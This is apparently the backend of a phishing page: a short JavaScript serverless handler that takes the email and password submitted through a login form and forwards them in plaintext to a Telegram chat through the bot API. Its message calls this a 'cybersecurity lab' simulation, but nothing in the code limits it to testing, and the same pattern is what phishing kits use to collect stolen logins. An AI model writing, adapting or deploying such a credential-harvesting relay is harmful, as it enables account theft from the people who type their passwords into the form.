export default async function handler(req, res) {

    if (req.method !== "POST") {
        return res.status(405).json({
            message: "Method not allowed"
        });
    }

    const { email } = req.body || {};

   
   const { password } = req.body || {};
   

    const token = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    if (!token || !chatId) {
        return res.status(500).json({
            message: "Server configuration missing"
        });
    }

    try {

        const response = await fetch(
            `https://api.telegram.org/bot${token}/sendMessage`,
            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    chat_id: chatId,

                    text:
                        "🔐 CYBERSECURITY LAB\n\n" +
                        "📧 Test Email: " + email + "\n" +
                        "🛡️ Simulation: Form submitted\n" +
                        "🔒 Password: " + password +"\n" +
                        "🕒 " + new Date().toISOString()
                })
            }
        );

        const data = await response.json();

        if (!response.ok || !data.ok) {
            console.error("Telegram API error:", data.description);

            return res.status(502).json({
                message: "Telegram notification failed"
            });
        }

        return res.status(200).json({
            message: "Simulation completed successfully!"
        });

    } catch (error) {

        console.error("Connection error:", error.message);

        return res.status(502).json({
            message: "Telegram connection failed"
        });
    }
}